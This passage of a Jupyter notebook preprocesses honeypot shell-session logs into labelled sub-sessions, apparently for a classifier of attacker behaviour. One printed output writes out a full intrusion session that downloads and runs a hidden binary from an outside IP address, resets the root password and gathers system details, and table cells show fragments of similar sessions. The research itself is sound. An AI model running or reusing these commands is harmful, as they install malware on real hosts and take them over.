    "new_df[\"sessions\"] = new_df[\"sessions\"].progress_apply(lambda session: session.strip())\n",
    "print(f\"After reshaping our sessions, we have {new_df.shape[0]} rows\")\n",
    "new_df.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "c40edc8e-e11c-4346-97f2-43ae5e2465a0",
   "metadata": {},
   "outputs": [],
   "source": [
    "new_df[\"sessions\"] = new_df.sessions.apply(lambda session: session.strip())"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c64e2ebb-2e13-4696-9fdb-36de2b3e348c",
   "metadata": {},
   "source": [
    "#### Visualize again plot above"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 37,
   "id": "76a9883e-7bde-48be-ba0d-42d08949db10",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 771477/771477 [00:01<00:00, 484642.48it/s]\n",
      "100%|██████████| 771477/771477 [00:08<00:00, 94388.21it/s]\n"
     ]
    }
   ],
   "source": [
    "new_df[\"len_sessions\"] = new_df[\"sessions\"].progress_apply(lambda session: len(session.split(\" \")))\n",
    "new_df[\"n_statements\"] = new_df[\"sessions\"].progress_apply(lambda session: len(obtain_statements(session)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "id": "d428991e-7867-4dc5-9931-1edaf639e469",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 504x360 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt \n",
    "\n",
    "fig, axs = plt.subplots(1, figsize=(7,5))\n",
    "fontsize = 20\n",
    "axs.scatter(new_df.n_statements, new_df.len_sessions, s = 20, label = \"New inference\", c = \"limegreen\")\n",
    "axs.scatter(df_labels.n_statements, df_labels.len_sessions, s = 20, label = \"Training\")\n",
    "axs.set_title(f\"|Statements| vs |Words|\\nper session\", fontsize = fontsize + 2)\n",
    "axs.set_xlabel(\"|Statements|\\nper session\", fontsize = fontsize)\n",
    "axs.set_ylabel(\"|Words|\\nper session\", fontsize = fontsize)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize, rotation = 30) \n",
    "lgnd = axs.legend(loc = \"upper left\", scatterpoints=1, fontsize = fontsize - 3)\n",
    "\n",
    "axs.grid()\n",
    "#axs.set_xscale(\"log\")\n",
    "#axs.set_yscale(\"log\")\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ec6d8057-e4ba-4fcb-bfd9-bb55ee9bfc05",
   "metadata": {},
   "source": [
    "### Also, plot ECDF of |statements|"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "id": "b470a014-0345-4e03-afc1-ae0a097f5fd0",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "\n",
    "cdf_before = unique_inference_corpus.n_statements.value_counts().sort_index().rename(\"cdf\")\n",
    "cdf_before = np.cumsum(cdf_before)/np.sum(cdf_before)\n",
    "\n",
    "cdf_after = new_df.n_statements.value_counts().sort_index().rename(\"cdf\")\n",
    "cdf_after = np.cumsum(cdf_after)/np.sum(cdf_after)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "eba925b8-e113-4bea-a10a-009834edf607",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x360 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "fig, axs = plt.subplots(1, figsize=(6,5))\n",
    "fontsize = 20\n",
    "axs.plot(cdf_before.reset_index()[\"index\"], cdf_before.reset_index()[\"cdf\"], linewidth = 2, label = \"Before\")\n",
    "axs.scatter(cdf_before.reset_index()[\"index\"], cdf_before.reset_index()[\"cdf\"], c = \"k\", s = 20)\n",
    "\n",
    "axs.plot(cdf_after.reset_index()[\"index\"], cdf_after.reset_index()[\"cdf\"], linewidth = 2, label = \"After\")\n",
    "axs.scatter(cdf_after.reset_index()[\"index\"], cdf_after.reset_index()[\"cdf\"], c = \"k\", s = 20)\n",
    "\n",
    "axs.set_xlabel('|statements| per session', fontsize = fontsize + 3)\n",
    "axs.set_title(f'ECDF of |statements| per session', fontsize = fontsize + 5)\n",
    "axs.set_ylabel('ECDF', fontsize = fontsize + 3)\n",
    "axs.yaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.xaxis.set_tick_params(labelsize=fontsize)\n",
    "axs.grid()\n",
    "axs.legend(fontsize=fontsize)\n",
    "axs.set_xscale(\"log\")\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80043e9e-9cde-4511-93e3-5f936e076a39",
   "metadata": {},
   "source": [
    "### Convert indexes_statements_context to word_indexes (words that are context and that therefore will not be labeled)\n",
    "#### Notice: valid only for token classification / word classification\n",
    "##### For statement classification keep using indexes_statements_context"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "id": "0f1a9c26-4e1d-4669-b15a-fb54f051f738",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 771477/771477 [00:28<00:00, 27153.54it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sessions</th>\n",
       "      <th>session_id</th>\n",
       "      <th>order_id</th>\n",
       "      <th>indexes_statements_context</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>indexes_words_context</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>[17, 16, 15, 14]</td>\n",
       "      <td>54</td>\n",
       "      <td>18</td>\n",
       "      <td>[39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...</td>\n",
       "      <td>0</td>\n",
       "      <td>2</td>\n",
       "      <td>[0, 1, 2, 3]</td>\n",
       "      <td>35</td>\n",
       "      <td>11</td>\n",
       "      <td>[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            sessions  session_id  order_id  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...           0         1   \n",
       "1  tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...           0         2   \n",
       "\n",
       "  indexes_statements_context  len_sessions  n_statements  \\\n",
       "0           [17, 16, 15, 14]            54            18   \n",
       "1               [0, 1, 2, 3]            35            11   \n",
       "\n",
       "                               indexes_words_context  \n",
       "0  [39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5...  \n",
       "1             [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]  "
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def statement2word(row):\n",
    "    context_indexes = row.indexes_statements_context\n",
    "    sessions = row.sessions\n",
    "    statements = obtain_statements(sessions)\n",
    "    indexes_words_context = []\n",
    "    current_index = 0\n",
    "    for it, statement in enumerate(statements):\n",
    "        if it in context_indexes:\n",
    "            for word_id in range(len(statement.split(\" \"))):\n",
    "                indexes_words_context.append(current_index + word_id)\n",
    "        current_index += len(statement.split(\" \")) # So that, while we progress with statements, words_id keep increasing\n",
    "    return indexes_words_context\n",
    "\n",
    "new_df[\"indexes_words_context\"] = new_df.progress_apply(lambda row: statement2word(row), axis = 1)\n",
    "new_df.head(2)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5b566f36-76ce-4475-8463-cec315abc76a",
   "metadata": {},
   "source": [
    "### Try recreating the original sessions and check if there is a match"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "id": "99b0fd29-c942-41f7-8c66-dad32091cd92",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "100%|██████████| 233037/233037 [02:04<00:00, 1868.66it/s]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session_id</th>\n",
       "      <th>original_session</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>2</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   session_id                                   original_session\n",
       "0           0  enable ; system ; shell ; sh ; cat /proc/mount...\n",
       "1           1  enable ; system ; shell ; sh ; cat /proc/mount...\n",
       "2           2  enable ; system ; shell ; sh ; cat /proc/mount..."
      ]
     },
     "execution_count": 42,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def recreate_original_sessions(rows):\n",
    "    rows.sort_values(by = \"order_id\", inplace = True)\n",
    "    session_id = rows.session_id.iloc[0]\n",
    "    sub_sessions = rows[\"sessions\"]\n",
    "    indexes_statements_context = rows[\"indexes_statements_context\"].values\n",
    "    indexes_words_context = rows[\"indexes_words_context\"].values\n",
    "    original_session = []\n",
    "    for sub_session, statement_context, word_context in zip(sub_sessions, indexes_statements_context, indexes_words_context): \n",
    "        words = sub_session.split(\" \")\n",
    "        original_session.append(\" \".join([words[it] for it in range(len(words)) if it not in word_context]))\n",
    "\n",
    "    return pd.Series({'original_session': \" \".join(original_session)})\n",
    "    \n",
    "grouped_df = new_df.groupby(\"session_id\").progress_apply(recreate_original_sessions).reset_index()   \n",
    "grouped_df.head(3)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "id": "597a37ec-c479-4f70-b5b2-c924b838995a",
   "metadata": {},
   "outputs": [],
   "source": [
    "sanity_check = unique_inference_corpus[[\"session_id\", \"truncated_session\"]].merge(grouped_df, on = \"session_id\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "id": "8d624f23-4beb-4f43-8e06-0a5b9f102e18",
   "metadata": {},
   "outputs": [
    {
     "ename": "AssertionError",
     "evalue": "Error: we were not able to recreate some of the original sessions!",
     "output_type": "error",
     "traceback": [
      "\u001b[0;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[0;31mAssertionError\u001b[0m                            Traceback (most recent call last)",
      "Input \u001b[0;32mIn [44]\u001b[0m, in \u001b[0;36m<cell line: 1>\u001b[0;34m()\u001b[0m\n\u001b[0;32m----> 1\u001b[0m \u001b[38;5;28;01massert\u001b[39;00m sanity_check[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mtruncated_session\u001b[39m\u001b[38;5;124m\"\u001b[39m]\u001b[38;5;241m.\u001b[39mequals(sanity_check[\u001b[38;5;124m\"\u001b[39m\u001b[38;5;124moriginal_session\u001b[39m\u001b[38;5;124m\"\u001b[39m]), \u001b[38;5;124m\"\u001b[39m\u001b[38;5;124mError: we were not able to recreate some of the original sessions!\u001b[39m\u001b[38;5;124m\"\u001b[39m\n",
      "\u001b[0;31mAssertionError\u001b[0m: Error: we were not able to recreate some of the original sessions!"
     ]
    }
   ],
   "source": [
    "assert sanity_check[\"truncated_session\"].equals(sanity_check[\"original_session\"]), \"Error: we were not able to recreate some of the original sessions!\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82c8b64d-3cef-4efd-b3be-224050774fd4",
   "metadata": {},
   "source": [
    "### Only few examples in which the original spacing is not preserved > minor"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "id": "61fa1e97-9035-447a-9e66-170f75d859bb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>self</th>\n",
       "      <th>other</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>1433</th>\n",
       "      <td>cd /tmp &amp;&amp; rm -rf .x15c* &amp;&amp; wget -q http://54....</td>\n",
       "      <td>cd /tmp &amp;&amp; rm -rf .x15c* &amp;&amp; wget -q http://54....</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3761</th>\n",
       "      <td>echo 'cd /tmp || cd /var/run || cd /mnt || cd ...</td>\n",
       "      <td>echo 'cd /tmp || cd /var/run || cd /mnt || cd ...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3966</th>\n",
       "      <td>cd /tmp &amp;&amp; rm -rf .x15c* &amp;&amp; wget -q http://54....</td>\n",
       "      <td>cd /tmp &amp;&amp; rm -rf .x15c* &amp;&amp; wget -q http://54....</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6264</th>\n",
       "      <td>cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...</td>\n",
       "      <td>cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6308</th>\n",
       "      <td>cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...</td>\n",
       "      <td>cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>187821</th>\n",
       "      <td>killall -9 perl ; cd /var/tmp/ ; cd /tmp/ ; rm...</td>\n",
       "      <td>killall -9 perl ; cd /var/tmp/ ; cd /tmp/ ; rm...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>194102</th>\n",
       "      <td>w ; ls ; nproc ; sudo su ; su ; admin ; ^C ; w...</td>\n",
       "      <td>w ; ls ; nproc ; sudo su ; su ; admin ; ^C ; w...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>216488</th>\n",
       "      <td>cat /etc/motd ; cat /etc/*release | grep 'DIST...</td>\n",
       "      <td>cat /etc/motd ; cat /etc/*release | grep 'DIST...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>222668</th>\n",
       "      <td>nproc ; ls ; passwd ; password ; w ; ls ; cd /...</td>\n",
       "      <td>nproc ; ls ; passwd ; password ; w ; ls ; cd /...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>224128</th>\n",
       "      <td>perl paul ; #!/bin/bash ; cd ; rm -rf .bashrc ...</td>\n",
       "      <td>perl paul ; #!/bin/bash ; cd ; rm -rf .bashrc ...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>121 rows × 2 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                     self  \\\n",
       "1433    cd /tmp && rm -rf .x15c* && wget -q http://54....   \n",
       "3761    echo 'cd /tmp || cd /var/run || cd /mnt || cd ...   \n",
       "3966    cd /tmp && rm -rf .x15c* && wget -q http://54....   \n",
       "6264    cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...   \n",
       "6308    cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...   \n",
       "...                                                   ...   \n",
       "187821  killall -9 perl ; cd /var/tmp/ ; cd /tmp/ ; rm...   \n",
       "194102  w ; ls ; nproc ; sudo su ; su ; admin ; ^C ; w...   \n",
       "216488  cat /etc/motd ; cat /etc/*release | grep 'DIST...   \n",
       "222668  nproc ; ls ; passwd ; password ; w ; ls ; cd /...   \n",
       "224128  perl paul ; #!/bin/bash ; cd ; rm -rf .bashrc ...   \n",
       "\n",
       "                                                    other  \n",
       "1433    cd /tmp && rm -rf .x15c* && wget -q http://54....  \n",
       "3761    echo 'cd /tmp || cd /var/run || cd /mnt || cd ...  \n",
       "3966    cd /tmp && rm -rf .x15c* && wget -q http://54....  \n",
       "6264    cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...  \n",
       "6308    cd /var/tmp ; echo \"IyEvYmluL2Jhc2gKY2QgL3RtcA...  \n",
       "...                                                   ...  \n",
       "187821  killall -9 perl ; cd /var/tmp/ ; cd /tmp/ ; rm...  \n",
       "194102  w ; ls ; nproc ; sudo su ; su ; admin ; ^C ; w...  \n",
       "216488  cat /etc/motd ; cat /etc/*release | grep 'DIST...  \n",
       "222668  nproc ; ls ; passwd ; password ; w ; ls ; cd /...  \n",
       "224128  perl paul ; #!/bin/bash ; cd ; rm -rf .bashrc ...  \n",
       "\n",
       "[121 rows x 2 columns]"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Look at the shape of the dataframe\n",
    "sanity_check[\"truncated_session\"].compare(sanity_check[\"original_session\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "id": "14522d6b-bc88-4b12-915f-f70bcaabc649",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "cd /tmp && rm -rf .x15c* && wget -q http://54.37.70.249/.x15cache || curl -O -f http://54.37.70.249/.x15cache ;  ; sleep 10s && cd /tmp && chmod +x .x15* ; /tmp/.x15cache ; cat /proc/cpuinfo | grep name | wc -l ; echo \"root:Zuqmum3zZTw1\" | chpasswd | bash ; echo \"321\" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;\n",
      "\n",
      "cd /tmp && rm -rf .x15c* && wget -q http://54.37.70.249/.x15cache || curl -O -f http://54.37.70.249/.x15cache ; ; sleep 10s && cd /tmp && chmod +x .x15* ; /tmp/.x15cache ; cat /proc/cpuinfo | grep name | wc -l ; echo \"root:Zuqmum3zZTw1\" | chpasswd | bash ; echo \"321\" > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }' ; free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' ; ls -lh $(which ls) ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;\n"
     ]
    }
   ],
   "source": [
    "print(sanity_check[\"truncated_session\"].compare(sanity_check[\"original_session\"]).self.iloc[0])\n",
    "print()\n",
    "print(sanity_check[\"truncated_session\"].compare(sanity_check[\"original_session\"]).other.iloc[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0f0ce232-c99a-4592-b8b2-dc52ca2f0703",
   "metadata": {},
   "source": [
    "### Save the two datasets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "id": "d95ba778-1037-4502-990e-4a108f5bbc63",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>sessions</th>\n",
       "      <th>session_id</th>\n",
       "      <th>order_id</th>\n",
       "      <th>indexes_statements_context</th>\n",
       "      <th>len_sessions</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>indexes_words_context</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "      <td>[17, 16, 15, 14]</td>\n",
       "      <td>54</td>\n",
       "      <td>18</td>\n",
       "      <td>[39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...</td>\n",
       "      <td>0</td>\n",
       "      <td>2</td>\n",
       "      <td>[0, 1, 2, 3]</td>\n",
       "      <td>35</td>\n",
       "      <td>11</td>\n",
       "      <td>[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            sessions  session_id  order_id  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...           0         1   \n",
       "1  tftp ; wget ; /bin/busybox SAEMW ; dd bs=52 co...           0         2   \n",
       "\n",
       "  indexes_statements_context  len_sessions  n_statements  \\\n",
       "0           [17, 16, 15, 14]            54            18   \n",
       "1               [0, 1, 2, 3]            35            11   \n",
       "\n",
       "                               indexes_words_context  \n",
       "0  [39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 5...  \n",
       "1             [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]  "
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "new_df.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "id": "a506b301-4da5-4a85-ae1c-f12682ebc647",
   "metadata": {},
   "outputs": [],
   "source": [
    "import csv\n",
    "new_df[[\"session_id\", \"sessions\", \"indexes_statements_context\", \"order_id\", \"indexes_words_context\"]].to_csv(\"./reduced_inference_sessions.csv\",index=False, quoting=csv.QUOTE_ALL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "35beba86-8996-4fdd-843d-c068197080f1",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "New dataset contains: 771477 rows (reduced sessions)\n"
     ]
    }
   ],
   "source": [
    "print(f\"New dataset contains: {new_df.shape[0]} rows (reduced sessions)\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "id": "ec72ee7a-a4f3-4d5b-9429-7c2427bc9727",
   "metadata": {},
   "outputs": [],
   "source": [
    "assert pd.read_csv(\"./reduced_inference_sessions.csv\").shape[0] == new_df.shape[0], \"Error exporting csv!\"    "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "b110ab56-4e5a-46bc-9882-9b5f9b201a6b",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>session_id</th>\n",
       "      <th>full_session</th>\n",
       "      <th>truncated_session</th>\n",
       "      <th>sensor</th>\n",
       "      <th>first_timestamp</th>\n",
       "      <th>date</th>\n",
       "      <th>n_statements</th>\n",
       "      <th>statements</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04 09:45:11.151186+00:00</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>21</td>\n",
       "      <td>[enable ;, system ;, shell ;, sh ;, cat /proc/...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>1</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>enable ; system ; shell ; sh ; cat /proc/mount...</td>\n",
       "      <td>eea5dc653b37</td>\n",
       "      <td>2019-06-04 09:45:50.396610+00:00</td>\n",
       "      <td>2019-06-04</td>\n",
       "      <td>21</td>\n",
       "      <td>[enable ;, system ;, shell ;, sh ;, cat /proc/...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   session_id                                       full_session  \\\n",
       "0           0  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "1           1  enable ; system ; shell ; sh ; cat /proc/mount...   \n",
       "\n",
       "                                   truncated_session        sensor  \\\n",
       "0  enable ; system ; shell ; sh ; cat /proc/mount...  eea5dc653b37   \n",
       "1  enable ; system ; shell ; sh ; cat /proc/mount...  eea5dc653b37   \n",
       "\n",
       "                   first_timestamp        date  n_statements  \\\n",
       "0 2019-06-04 09:45:11.151186+00:00  2019-06-04            21   \n",
       "1 2019-06-04 09:45:50.396610+00:00  2019-06-04            21   \n",
       "\n",
       "                                          statements  \n",
       "0  [enable ;, system ;, shell ;, sh ;, cat /proc/...  \n",
       "1  [enable ;, system ;, shell ;, sh ;, cat /proc/...  "
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "unique_inference_corpus.head(2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "id": "5743be3e-813a-4e6b-a428-6c2019e37797",
   "metadata": {},
   "outputs": [],
   "source": [
    "unique_inference_corpus[[\"session_id\", \"full_session\", \"sensor\", \"first_timestamp\", \"date\"]].to_csv(\"./inference_sessions.csv\",index = False, quoting=csv.QUOTE_ALL)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "id": "57809c57-6f15-4e12-bebe-9b1dc9784700",
   "metadata": {},
   "outputs": [],
   "source": [
    "assert pd.read_csv(\"./inference_sessions.csv\").shape[0] == unique_inference_corpus.shape[0], \"Error exporting csv!\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e5021478-24d1-4dd7-a027-2e221317b199",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
